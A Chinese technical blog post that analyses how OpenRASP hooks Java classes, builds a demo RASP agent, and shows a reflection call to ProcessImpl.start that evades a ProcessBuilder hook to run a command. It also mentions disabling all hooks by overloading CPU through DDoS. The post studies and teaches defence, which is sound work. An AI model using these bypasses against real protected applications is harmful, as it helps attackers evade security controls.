<p>代码很简单，这里检测是否是可能存在XXE漏洞的类。之后查看<code>com.baidu.openrasp.hook.xxe.XXEHook#hookMethod</code>，看看是怎么更改这些类的代码的：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd6df1ddac507cc859e6a.jpg" alt="image-20230805235310814"></p>
<p>这里通过调用了<code>com.baidu.openrasp.hook.AbstractClassHook#getInvokeStaticSrc</code>方法获取了需要插入到这些类的expandSystemId()和setDescription()方法中的一些代码。getInvokeStaticSrc()如下所示：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getInvokeStaticSrc</span><span class="params">(Class invokeClass, String methodName, String paramString, Class... parameterTypes)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">invokeClassName</span> <span class="operator">=</span> invokeClass.getName();</span><br><span class="line">        <span class="type">String</span> <span class="variable">parameterTypesString</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (parameterTypes != <span class="literal">null</span> &amp;&amp; parameterTypes.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            Class[] arr$ = parameterTypes;</span><br><span class="line">            <span class="type">int</span> <span class="variable">len$</span> <span class="operator">=</span> parameterTypes.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i$</span> <span class="operator">=</span> <span class="number">0</span>; i$ &lt; len$; ++i$) &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">parameterType</span> <span class="operator">=</span> arr$[i$];</span><br><span class="line">                <span class="keyword">if</span> (parameterType.getName().startsWith(<span class="string">&quot;[&quot;</span>)) &#123;</span><br><span class="line">                    parameterTypesString = parameterTypesString + <span class="string">&quot;Class.forName(\&quot;&quot;</span> + parameterType.getName() + <span class="string">&quot;\&quot;),&quot;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    parameterTypesString = parameterTypesString + parameterType.getName() + <span class="string">&quot;.class,&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            parameterTypesString = parameterTypesString.substring(<span class="number">0</span>, parameterTypesString.length() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (parameterTypesString.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            parameterTypesString = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            parameterTypesString = <span class="string">&quot;new Class[]&#123;&quot;</span> + parameterTypesString + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String src;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.isLoadedByBootstrapLoader) &#123;</span><br><span class="line">            src = <span class="string">&quot;com.baidu.openrasp.ModuleLoader.moduleClassLoader.loadClass(\&quot;&quot;</span> + invokeClassName + <span class="string">&quot;\&quot;).getMethod(\&quot;&quot;</span> + methodName + <span class="string">&quot;\&quot;,&quot;</span> + parameterTypesString + <span class="string">&quot;).invoke(null&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (!StringUtils.isEmpty(paramString)) &#123;</span><br><span class="line">                src = src + <span class="string">&quot;,new Object[]&#123;&quot;</span> + paramString + <span class="string">&quot;&#125;);&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                src = src + <span class="string">&quot;,null);&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            src = <span class="string">&quot;try &#123;&quot;</span> + src + <span class="string">&quot;&#125; catch (Throwable t) &#123;if(t.getCause() != null &amp;&amp; t.getCause().getClass()&quot;</span> + <span class="string">&quot;.getName().equals(\&quot;com.baidu.openrasp.exceptions.SecurityException\&quot;))&#123;throw t;&#125;&#125;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            src = invokeClassName + <span class="string">&#x27;.&#x27;</span> + methodName + <span class="string">&quot;(&quot;</span> + paramString + <span class="string">&quot;);&quot;</span>;</span><br><span class="line">            src = <span class="string">&quot;try &#123;&quot;</span> + src + <span class="string">&quot;&#125; catch (Throwable t) &#123;if(t.getClass()&quot;</span> + <span class="string">&quot;.getName().equals(\&quot;com.baidu.openrasp.exceptions.SecurityException\&quot;))&#123;throw t;&#125;&#125;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> src;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>大致逻辑就是获取XXEHook类的checkXXE方法的字节码并将其写入到了sink点的运行前，也就是我们上边提到的那两个方法。现在还记得我们之前看到的将jar包添加到BootstrapClassloader的搜索路径的操作吗？注意看getInvokeStaticSrc方法这里在sink点的运行前添加了一段<code>src = &quot;com.baidu.openrasp.ModuleLoader.moduleClassLoader.loadClass(\&quot;&quot; + invokeClassName + &quot;\&quot;).getMethod(\&quot;&quot; + methodName + &quot;\&quot;,&quot; + parameterTypesString + &quot;).invoke(null&quot;;</code>，moduleClassLoader是BootstrapClassloader，因此当我们在由BootstrapClassloader加载的类中插入这段代码时，这个类就可以加载到了<code>XXXHook</code>中的<code>checkXXX</code>方法来进行检测防御了。在此处就是加载到了XXEHook中的checkXXE方法。</p>
<p>之后我们跟进一下checkXXX方法看看是怎么对恶意攻击进行防御的，以XXEHOOK的checkXXE方法为例：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd6ed1ddac507cc85ba45.jpg" alt="image-20230806144603157"></p>
<p>调用到com.baidu.openrasp.HookHandler#doCheck，之后又调用到com.baidu.openrasp.HookHandler#doCheckWithoutRequest：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd6fa1ddac507cc85da96.jpg" alt="image-20230806144732533"></p>
<p>此处为RASP的熔断开关，当服务器的cpu使用率超过90%，禁用全部hook点 ：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Config.getConfig().getDisableHooks()) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为业务大于安全的考录，熔断开关在许多的RASP产品都可以进行设置。因此有师傅提到也许可以通过DDOS，让CPU高负载，使用率超过90%，从而禁用全部hook点。当云控注册成功之前，不进入任何hook点：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Config.getConfig().getCloudSwitch() &amp;&amp; Config.getConfig().getHookWhiteAll()) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后走到com.baidu.openrasp.HookHandler#doRealCheckWithoutRequest，在这里，首先判断RASP开关是否打开，即对<code>enableHook.get()</code>作判断。之后，做了一些参数的封装，以及失败日志、耗时日志等输出，并且在检测到攻击时（下一层返回），抛出异常：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doRealCheckWithoutRequest</span><span class="params">(CheckParameter.Type type, Map params)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (enableHook.get()) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0L</span>;</span><br><span class="line">            <span class="keyword">if</span> (Config.getConfig().getDebugLevel() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                a = System.currentTimeMillis();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isBlock</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="type">CheckParameter</span> <span class="variable">parameter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CheckParameter</span>(type, params);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                isBlock = CheckerManager.check(type, parameter);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var12) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;plugin check error: &quot;</span> + var12.getClass().getName() + <span class="string">&quot; because: &quot;</span> + var12.getMessage();</span><br><span class="line">                <span class="type">AbstractRequest</span> <span class="variable">request</span> <span class="operator">=</span> (AbstractRequest)requestCache.get();</span><br><span class="line">                <span class="keyword">if</span> (request != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">StringBuffer</span> <span class="variable">url</span> <span class="operator">=</span> request.getRequestURL();</span><br><span class="line">                    <span class="keyword">if</span> (!StringUtils.isEmpty(url)) &#123;</span><br><span class="line">                        msg = url + <span class="string">&quot; &quot;</span> + msg;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                LogTool.error(ErrorType.PLUGIN_ERROR, msg, var12);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (a &gt; <span class="number">0L</span>) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">t</span> <span class="operator">=</span> System.currentTimeMillis() - a;</span><br><span class="line">                <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;type=&quot;</span> + type.getName() + <span class="string">&quot; &quot;</span> + <span class="string">&quot;time=&quot;</span> + t;</span><br><span class="line">                <span class="keyword">if</span> (requestCache.get() != <span class="literal">null</span>) &#123;</span><br><span class="line">                    LOGGER.info(<span class="string">&quot;request_id=&quot;</span> + ((AbstractRequest)requestCache.get()).getRequestId() + <span class="string">&quot; &quot;</span> + message);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    LOGGER.info(message);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (isBlock) &#123;</span><br><span class="line">                handleBlock(parameter);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>接着执行到com.baidu.openrasp.plugin.checker.CheckerManager#check：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(CheckParameter.Type type, CheckParameter parameter)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ((Checker)checkers.get(type)).check(parameter);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里根据传入的type来选择调用相对应的checkers的check方法，假设此时的checker是V8AttackChecker，那么就会调用com.baidu.openrasp.plugin.checker.AbstractChecker#check：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd7081ddac507cc85f97b.jpg" alt="image-20230806145906724"></p>
<p>调用了相应checker的checkParam方法，那我们看看com.baidu.openrasp.plugin.checker.v8.V8AttackChecker#checkParam：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd7131ddac507cc860fd6.jpg" alt="image-20230806145936500"></p>
<p>继续跟进com.baidu.openrasp.plugin.js.JS#Check：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd71e1ddac507cc8629ae.jpg" alt="image-20230806150051302"></p>
<p>箭头指向的地方即是调用JS插件进行检测的地方了。</p>
<h2 id="Demo-RASP实现"><a href="#Demo-RASP实现" class="headerlink" title="Demo RASP实现"></a>Demo RASP实现</h2><p>众所周知，常见的Runtime.getRuntime().exec()执行命令的底层逻辑是通过ProcessBuilder的start方法去执行命令的，而ProcessBuilder执行命令实际上也是调用了ProcessImpl这个类的start方法。那我们如果想防止这种命令执行的话，就需要在ProcessImpl处进行hook。我们先来看看OpenRASP是怎么做的，首先看看如何匹配类的：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd7291ddac507cc8643bb.jpg" alt="image-20230806135243062"></p>
<p>先判断java版本，如果大于等于1.9则对<code>java/lang/ProcessImpl</code>进行hook，这是因为在JDK9的时候把<code>UNIXProcess</code>合并到了<code>ProcessImpl</code>当中，参考<a target="_blank" rel="noopener" href="https://hg.openjdk.org/jdk-updates/jdk9u/jdk/rev/98eb910c9a97">https://hg.openjdk.org/jdk-updates/jdk9u/jdk/rev/98eb910c9a97</a>。之后如果小于1.9继续判断，如果是Windows操作系统，则对<code>java/lang/ProcessImpl</code>进行hook，否则对java&#x2F;lang&#x2F;UNIXProcess进行hook。我们继续看看插入的代码：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd7341ddac507cc8657eb.jpg" alt="image-20230806135850824"></p>
<p>根据相应的逻辑在ProcessImpl类的初始化方法或者UNIXProcess类的初始化方法中插入相应的<code>checkCommand</code>方法。现在我先来给大家写一个Demo RASP，并给出其相应bypass方法。首先给出实现了premain方法的PreMainDemo类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.UnmodifiableClassException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLDecoder;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PreMainDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> <span class="keyword">throws</span> IOException, UnmodifiableClassException &#123;</span><br><span class="line">        <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>();</span><br><span class="line"></span><br><span class="line">        addJarToBootstrap(inst);</span><br><span class="line">        Class[] classes = inst.getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Class aClass : classes) &#123;</span><br><span class="line"><span class="comment">//            System.out.println(aClass);</span></span><br><span class="line">            <span class="keyword">if</span> (aClass.getName().contains(<span class="string">&quot;ProcessBuilder&quot;</span>) &amp;&amp; inst.isModifiableClass(aClass))&#123;</span><br><span class="line">                inst.addTransformer(<span class="keyword">new</span> <span class="title class_">TransformerDemo</span>(),<span class="literal">true</span>);</span><br><span class="line">                inst.retransformClasses(aClass);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getLocalJarPath</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">localUrl</span> <span class="operator">=</span> PreMainDemo.class.getProtectionDomain().getCodeSource().getLocation();</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            path = URLDecoder.decode(localUrl.getFile().replace(<span class="string">&quot;+&quot;</span>, <span class="string">&quot;%2B&quot;</span>), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException var3) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;[OpenRASP] Failed to get jarFile path.&quot;</span>);</span><br><span class="line">            var3.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> path;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addJarToBootstrap</span><span class="params">(Instrumentation inst)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">localJarPath</span> <span class="operator">=</span> getLocalJarPath();</span><br><span class="line">        inst.appendToBootstrapClassLoaderSearch(<span class="keyword">new</span> <span class="title class_">JarFile</span>(localJarPath));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来是ClassFileTransformer的实现类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerDemo</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="literal">null</span>;</span><br><span class="line">        className = className.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (className.equals(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ClassPool</span> <span class="variable">cp</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> cp.get(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">                CtMethod[] methods = ctClass.getMethods();</span><br><span class="line">                <span class="type">String</span> <span class="variable">source</span> <span class="operator">=</span> <span class="string">&quot;    System.out.println(\&quot;Get Out!Hacker!\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    return null;\n&quot;</span>;</span><br><span class="line">                <span class="keyword">for</span> (CtMethod method : methods) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;start&quot;</span>)) &#123;</span><br><span class="line">                        method.insertBefore(source);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                bytes = ctClass.toBytecode();</span><br><span class="line">                ctClass.detach();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">//                e.printStackTrace();</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个Demo非常的简单，与OpenRASP类似，都是将agent.jar添加到BootstrapClassloader，但是因为我们这个Demo并不在BootstrapClassloader加载的类中添加调用agent.jar的代码，因此在这个Demo中这部分可以忽略。之后我们还new了一个ProcessBuilder类，因为如果不创建这个实例的话，inst.getAllLoadedClasses()中将没有这个类。之后我们<strong>无脑</strong>对ProcessBuilder类的start方法添加了两行代码，首先输出Get Out!Hacker!，之后return。为什么说是无脑呢？因为我们这样做，会使得正常的命令执行的需求都被屏蔽了，而且hook的是ProcessBuilder类而非ProcessImpl类，为什么hook的是ProcessBuilder就有问题呢？接下来我来给大家做个演示，再来写一个执行命令的类来模拟黑客攻击：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;mate-calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一行很简单的弹计算器的代码，之后我们添加VM Options，添加<code>-javaagent</code>为我们刚刚打包好的Demo.jar：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd7411ddac507cc867270.jpg" alt="image-20230806141750369"></p>
<p>之后运行，结果如下：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd74f1ddac507cc868ffb.jpg" alt="image-20230806141939188"></p>
<p>没有弹出计算器，执行到ProcessBuilder的start方法后输出Get Out!Hacker!并返回了，因此并没有成功执行命令。那我们换一种方法，因为Runtime.getRuntime().exec()的底层就是调用ProcessBuilder的start方法，那我们直接利用ProcessBuilder的start方法执行命令试试：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ProcessBuilder</span> <span class="variable">command</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>().command(<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;mate-calc&quot;</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> command.start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>依然符合预期：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd75a1ddac507cc86a5be.jpg" alt="image-20230806142227583"></p>
<p>但是请注意，我们刚刚提到了，Runtime.getRuntime().exec()执行命令的底层逻辑是通过ProcessBuilder去执行命令的，而ProcessBuilder执行命令实际是调用了ProcessImpl这个类。那假如我们直接使用ProcessImpl类的start方法去执行命令，是不是就能绕过了？</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        String[] cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;mate-calc&quot;</span>&#125;;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;start&quot;</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="type">boolean</span>.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">e</span> <span class="operator">=</span> (Process) method.invoke(<span class="literal">null</span>, cmds, <span class="literal">null</span>, <span class="string">&quot;.&quot;</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功bypass：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd7661ddac507cc86bfe0.jpg" alt="image-20230806142428935"></p>
<p><strong>从这里我们就可以发现，如果我们要写一个针对某种漏洞的RASP，就必需将这种漏洞的底层原理搞清楚。否则就像上面提到的例子，绕过是很轻松的。</strong>这一点就与WAF有很大差别，WAF可能只需要对一些关键字进行过滤即可防御攻击，但是RASP却不行。</p>
<p>我们刚刚写这个Demo RASP的时候还遇到了一个问题，那就是我们过滤的时候直接将所有的命令都给屏蔽了。可是我们很多时候又确实有执行命令的需求，那对于这一点我们该怎么做呢？我们先看看万能的OpenRASP是怎么做的：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd7721ddac507cc86db09.jpg" alt="image-20230806172951560"></p>
<p>OpenRASP通过黑名单的方式对部分命令进行了正则过滤，可是很明显，这样做仍然很不安全，最大原因就是黑名单的命令不够完备，攻击者很轻松就可以绕过。这里又引出一个问题，如果继续完善黑名单，会耗费巨大的人力不说，还会使得应用的性能严重下降。那如果采用白名单呢？如果我们想执行什么命令，就对此命令加白，似乎又显得非常麻烦。因为本人水平所致，没有办法给出既能使得性能下降不明显，又能使防御能力大幅度上升的做法。不过笔者更倾向白名单的方式对命令进行过滤。</p>
<h2 id="Bypass-OpenRASP"><a href="#Bypass-OpenRASP" class="headerlink" title="Bypass OpenRASP"></a>Bypass OpenRASP</h2><h3 id="Unsafe绕过"><a href="#Unsafe绕过" class="headerlink" title="Unsafe绕过"></a>Unsafe绕过</h3><p>首先设置44行的all_log为false，即关闭观察模式：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd7801ddac507cc86f61d.jpg" alt="image-20230806200227925"></p>
<p>之后将命令注入模块的action由log改为block，此时我们就打开了拦截模式：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd7891ddac507cc870802.jpg" alt="image-20230806200209175"></p>
<p>我们先写一个HttpServlet，其中doGet方法为：</p>
